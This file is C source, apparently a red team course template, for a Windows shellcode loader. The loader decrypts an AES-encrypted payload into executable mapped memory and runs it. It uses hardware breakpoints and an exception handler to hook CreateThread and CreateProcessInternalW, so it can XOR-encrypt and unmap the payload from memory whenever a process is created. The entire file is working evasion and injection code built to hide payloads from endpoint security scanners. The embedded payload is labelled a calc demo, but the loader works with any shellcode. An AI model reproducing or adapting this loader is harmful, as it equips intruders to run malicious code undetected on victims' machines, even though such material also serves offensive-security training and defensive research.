/*
 Red Team Operator course code template
 Hidden memory with CreateFileMapping and hardware breakpoints

 author: reenz0h (twitter: @SEKTOR7net)
 inspiration: Ninjasploit (by Charalampos Billinis)
 credits: Frank Block & Ralph Palutke
*/

#include <windows.h>
#include <stdio.h>
#include <wincrypt.h>

#define _CRT_RAND_S
#include <stdlib.h>

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "advapi32")

// calc shellcode (exitThread) - 64-bit
unsigned char payload[] = { 0xd0, 0xd0, 0x39, 0x93, 0x43, 0x15, 0x34, 0xd8, 0x89, 0x71, 0x60, 0xcc, 0xa8, 0x2e, 0x4, 0x50, 0xd2, 0x0, 0x53, 0xc6, 0x4d, 0xdd, 0xee, 0xfa, 0xd8, 0x78, 0x91, 0x10, 0x4, 0xc8, 0x8, 0x46, 0x7e, 0x32, 0x6a, 0xb6, 0x71, 0xaf, 0x7, 0x2d, 0x0, 0xf6, 0x5d, 0x94, 0xa2, 0xf0, 0x90, 0xbe, 0xea, 0x4e, 0xd7, 0xe1, 0xc3, 0x3, 0xc2, 0x1f, 0xaf, 0x11, 0x12, 0x30, 0xe3, 0x43, 0xe1, 0xf8, 0x74, 0x45, 0xb0, 0xfd, 0x8, 0xb8, 0x11, 0xf8, 0x6f, 0x33, 0x39, 0xa6, 0x1c, 0xf2, 0xc8, 0x30, 0x5, 0x3, 0xae, 0xb, 0x5e, 0xad, 0x62, 0x1c, 0x1b, 0xc2, 0x47, 0x45, 0x91, 0x70, 0x7a, 0x9a, 0xb8, 0xcd, 0xb5, 0xf5, 0x5d, 0x43, 0x95, 0xe8, 0x68, 0xda, 0xa8, 0xd0, 0x4, 0x4f, 0x30, 0x6, 0x54, 0xd2, 0xe, 0x62, 0xc4, 0xd9, 0x61, 0x5b, 0x4f, 0x4c, 0x5d, 0xd, 0x63, 0x74, 0x8b, 0x54, 0x17, 0xf3, 0x57, 0x32, 0xa9, 0x77, 0xfd, 0xb1, 0x4a, 0x5a, 0x5f, 0xc6, 0xe6, 0x1f, 0x6, 0x4a, 0x3, 0x1e, 0x83, 0x8a, 0x7a, 0xb0, 0xc1, 0xc1, 0xc7, 0x7c, 0xa6, 0x7a, 0x72, 0xc8, 0xb5, 0x66, 0xd5, 0xf6, 0x3f, 0x3c, 0xa8, 0xea, 0x45, 0x46, 0x8f, 0x73, 0x65, 0xae, 0x9, 0x97, 0xf5, 0x79, 0x7f, 0x14, 0x8f, 0xd6, 0xe8, 0x2b, 0x26, 0x8d, 0x36, 0x4b, 0x83, 0x8b, 0xa7, 0xad, 0x56, 0x68, 0x17, 0xa1, 0x68, 0xd, 0xf7, 0x6f, 0x29, 0x40, 0x71, 0xbd, 0x8f, 0x80, 0x3a, 0x8, 0xf4, 0x26, 0x79, 0x3c, 0xf2, 0x61, 0x11, 0x83, 0xd6, 0x8b, 0x27, 0xb5, 0xe5, 0x6f, 0x4c, 0x48, 0x15, 0x9d, 0x3, 0x26, 0xd2, 0x5, 0xae, 0xda, 0xf3, 0x74, 0xe3, 0x58, 0x9f, 0xca, 0x6d, 0x58, 0xdf, 0xc4, 0x68, 0xef, 0xc7, 0xcd, 0x26, 0xb6, 0x92, 0xe4, 0x66, 0xf3, 0x6a, 0x35, 0xa0, 0x8b, 0x93, 0xb4, 0xfb, 0x63, 0x1a, 0x1c, 0xbe, 0x2, 0x87, 0xd7, 0x54, 0xc8, 0x1, 0x5a, 0x37, 0x84, 0x48, 0x4d, 0xda, 0x27, 0x90, 0xb9, 0xf6, 0xf6, 0x31, 0xeb, 0xeb, 0x64, 0xf4, 0xa5, 0xa, 0x70, 0xe0, 0x37 };


char key[] = { 0x81, 0x3c, 0x2c, 0xef, 0xc0, 0x5f, 0x9b, 0xe1, 0xbf, 0xba, 0x93, 0x3c, 0xaf, 0x1f, 0xda, 0x9d };
unsigned int payload_len = sizeof(payload);

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG           Length;
    HANDLE          RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef BOOL(WINAPI* CreateProcessInternalW_t)(
    HANDLE hToken,
    LPCWSTR lpApplicationName,
    LPWSTR lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL bInheritHandles,
    DWORD dwCreationFlags,
    LPVOID lpEnvironment,
    LPCWSTR lpCurrentDirectory,
    LPSTARTUPINFOW lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation,
    PHANDLE hNewToken
);

CreateProcessInternalW_t pCreateProcessInternalW;
HANDLE globalThread = NULL;
void* globalExec_Mem = NULL;

int AESDecrypt(char* payload, unsigned int payload_len, char* key, size_t keylen) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        return -1;
    }
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        return -1;
    }
    if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)) {
        return -1;
    }
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
        return -1;
    }
    if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)payload, (DWORD*)&payload_len)) {
        return -1;
    }

    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);

    return 0;
}

void XOR(char* data, size_t data_len, char* key, size_t key_len) {
    for (size_t i = 0, j = 0; i < data_len; i++) {
        data[i] ^= key[j];
        j = (j + 1) % key_len;
    }
}

HANDLE g_Map = NULL;
LPVOID g_MapView = NULL;
int mapsize = 0x2000;

int SetHWBP(HANDLE thrd, DWORD64 addr, BOOL setBP, int DRid) {
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_ALL;
    GetThreadContext(thrd, &ctx);

    if (DRid < 0 || DRid > 3)
        return -DRid;

    if (setBP == TRUE) {
        *((size_t*)&ctx.Dr0 + DRid) = addr;
        ctx.Dr7 |= (1 << (0 + 2 * DRid));    // Local breakpoint in DR{DRid}
        ctx.Dr7 &= ~(1 << (16 + 4 * DRid));  // Break on execution
        ctx.Dr7 &= ~(1 << (17 + 4 * DRid));
    }
    else {
        *((size_t*)&ctx.Dr0 + DRid) = NULL;
        ctx.Dr7 &= ~(1 << (0 + 2 * DRid));   // Clear the breakpoint
    }

    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    SetThreadContext(thrd, &ctx);

    return 0;
}

int Go(void) {
    printf("[*] Initiating the stealth memory mapping process...\n");
    g_Map = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, mapsize, NULL);
    g_MapView = (LPBYTE)MapViewOfFile(g_Map, FILE_MAP_ALL_ACCESS | FILE_MAP_EXECUTE, 0, 0, 0);
    printf("[*] Memory successfully mapped at address: %p\n", g_MapView);

    // Decrypt payload
    printf("[*] Commencing payload decryption...\n");
    AESDecrypt((char*)payload, payload_len, (char*)key, sizeof(key));

    // Copy payload to allocated buffer
    printf("[*] Injecting decrypted payload into the mapped memory region...\n");
    RtlMoveMemory(g_MapView, payload, payload_len);

    // Clear the original payload 
    printf("[*] Sanitizing memory by clearing original payload data...\n");
    memset(payload, 0, payload_len);

    // Launch the payload
    printf("[*] Spawning a new thread to execute the payload...\n");
    globalThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)g_MapView, 0, 0, 0);
    WaitForSingleObject(globalThread, -1);

    return 0;
}

BOOL myCreateProcessInternalW(
    HANDLE hToken, LPCWSTR lpApplicationName, LPWSTR lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory,
    LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation, PHANDLE hNewToken) {

    char key[16];
    unsigned int r = 0;

    for (int i = 0; i < 16; i++) {
        rand_s(&r);
        key[i] = (char)r;
    }

    // Encrypt the payload
    XOR((char*)g_MapView, payload_len, key, sizeof(key));
    printf("[*] Payload encryption complete. Memory region secured.\n");

    // Unmap the memory
    UnmapViewOfFile(g_MapView);
    printf("[*] Mapped memory region released.\n");

    // Call the original CreateProcessInternalW function
    SetHWBP(GetCurrentThread(), (DWORD64)pCreateProcessInternalW, FALSE, 0);
    BOOL res = pCreateProcessInternalW(hToken, lpApplicationName, lpCommandLine, lpProcessAttributes,
        lpThreadAttributes, bInheritHandles, dwCreationFlags, lpEnvironment, lpCurrentDirectory,
        lpStartupInfo, lpProcessInformation, hNewToken);
    SetHWBP(GetCurrentThread(), (DWORD64)pCreateProcessInternalW, TRUE, 0);

    // Restore the memory and decrypt
    g_MapView = (LPBYTE)MapViewOfFile(g_Map, FILE_MAP_ALL_ACCESS | FILE_MAP_EXECUTE, 0, 0, 0);
    XOR((char*)g_MapView, payload_len, key, sizeof(key));

    return res;
}

HANDLE myCreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId) {
    HANDLE hdl;

    SetHWBP(GetCurrentThread(), (DWORD64)&CreateThread, FALSE, 3);
    hdl = CreateThread(lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags | CREATE_SUSPENDED, lpThreadId);

    if (hdl != NULL) {
        SetHWBP(hdl, (DWORD64)pCreateProcessInternalW, TRUE, 0);
        SetHWBP(hdl, (DWORD64)&CreateThread, TRUE, 3);
        printf("[*] Thread created and breakpoint set. Resuming execution...\n");
        ResumeThread(hdl);
    }

    SetHWBP(GetCurrentThread(), (DWORD64)&CreateThread, TRUE, 3);
    return hdl;
}

LONG WINAPI handler(EXCEPTION_POINTERS* ExceptionInfo) {
    if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        if (ExceptionInfo->ContextRecord->Rip == (DWORD64)CreateThread) {
            printf("[*] Intercepted CreateThread() call, modifying execution flow...\n");
            ExceptionInfo->ContextRecord->Rip = (DWORD64)&myCreateThread;
        }
        if (ExceptionInfo->ContextRecord->Rip == (DWORD64)pCreateProcessInternalW) {
            printf("[*] CreateProcessInternalW() call intercepted, redirecting...\n");
            ExceptionInfo->ContextRecord->Rip = (DWORD64)&myCreateProcessInternalW;
        }
    }
    return EXCEPTION_CONTINUE_EXECUTION;
}

int main() {
    pCreateProcessInternalW = (CreateProcessInternalW_t)GetProcAddress(GetModuleHandleA("kernelbase.dll"), "CreateProcessInternalW");

    printf("[*] Preparing to set hardware breakpoints for monitoring...\n");
    AddVectoredExceptionHandler(1, handler);
    SetHWBP(GetCurrentThread(), (DWORD64)pCreateProcessInternalW, TRUE, 0);
    SetHWBP(GetCurrentThread(), (DWORD64)&CreateThread, TRUE, 3);

    Go();
    return 0;
}
